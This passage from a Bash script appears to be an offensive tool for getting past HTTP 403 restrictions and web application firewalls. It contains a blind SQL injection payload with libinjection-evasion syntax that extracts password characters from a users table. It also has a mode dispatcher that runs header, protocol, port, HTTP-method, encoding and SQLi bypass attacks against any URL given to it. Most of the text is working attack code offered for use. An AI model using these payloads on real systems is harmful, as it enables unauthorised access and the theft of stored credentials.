	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}/1.e(substring(' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Payload [ 1.e(ascii 1.e(substring(1.e(select password from users limit 1 1.e,1 1.e) 1.e,1 1.e,1 1.e)1.e)1.e) = 70 or'1'='2 ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/1.e(ascii%201.e(substring(1.e(select%20password%20from%20users%20limit%201%201.e%2C1%201.e)%201.e%2C1%201.e%2C1%201.e)1.e)1.e)%20%3D%2070%20or'1'%3D'2'" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}/1.e(ascii%%%%201.e(substring(1.e(select%%%%20password%%%%20from%%%%20users%%%%20limit%%%%201%%%%201.e%%%%2C1%%%%201.e)%%%%201.e%%%%2C1%%%%201.e%%%%2C1%%%%201.e)1.e)1.e)%%%%20%%%%3D%%%%2070%%%%20or'1'%%%%3D'2' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
}
function 403bypass(){ 
	Header_Bypass
	Protocol_Bypass
	Port_Bypass
	HTTP_Method_Bypass
	URL_Encode_Bypass
	SQLi_libinjection
}
function prg(){
	delay=0
	set +u
	while :;do
		case $1 in
			'-u'|'--url')
					target=$2
					path=$(echo $2 | cut -d "/" -f4- )
					domain=$(echo $2 | cut -d "/" -f3)
					shift
					;;
			## modes
			'--header')
				mode='header'
				;;
			'--protocol')
				mode='proto'
				;;
			'--port')
				mode='port'
				;;
			'--HTTPmethod')
				mode='HTTPmethod'
				;;
			'--encode')
				mode='encode'
				;;
			'--exploit')
				mode='exploit'
				;;
    			'--delay='*)
    				delay="${1#*=}"  # Extrait la valeur après le "="
    				;;
			'--SQLi')
				mode='sqli'
				;;
			'-h'|'--help')
					usage
					exit 0
					;;
			"")
					shift
					break
					;;
			'*')
				 		 echo "Error: unknown: ${target}"
                         usage
                         exit 127
                         ;;
		esac
		shift
	done
	clean_domain=$(echo "$domain" | sed -E 's~^https?://~~' | cut -d/ -f1)

	# Résolution IP
	website_ip=$(dig +short "$clean_domain" | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}' | head -n1)

	if [[ -z "${target}" ]];then
        printf "\n[${red}!${end}] ${yellow}No URL/PATH <scheme://domain.tld/path> given. Make sure you go through the usage/help${end}\n\n"
        usage
        exit 127
    fi
	if [[ -z "${mode}" ]];then
        printf "\n[${red}!${end}] ${yellow}No mode given. Make sure you go through the usage/help${end}\n\n"
        usage
        exit 127
    fi

	if [ "${mode}" == 'header' ];then
			echo "header"
			banner
            Header_Bypass
            exit 0
    elif [ "${mode}" == 'proto' ];then
			echo "protocol"
			banner
        	Protocol_Bypass
        	exit 0
	elif [ "${mode}" == 'port' ];then
			echo "port"
			banner
        	Port_Bypass
        	exit 0
	elif [ "${mode}" == 'HTTPmethod' ];then
			echo "HTTPmethod"
			banner
        	HTTP_Method_Bypass
        	exit 0
	elif [ "${mode}" == 'encode' ];then
			echo "encode"
			banner
        	URL_Encode_Bypass
        	exit 0
	elif [ "${mode}" == 'sqli' ];then
			echo "SQLi"
			banner
			SQLi_libinjection
			exit 0 
	elif [ "${mode}" == 'exploit' ];then
			echo "exploit"
        	banner
			403bypass
        	exit 0
	fi
}
prg $@
tput sgr0
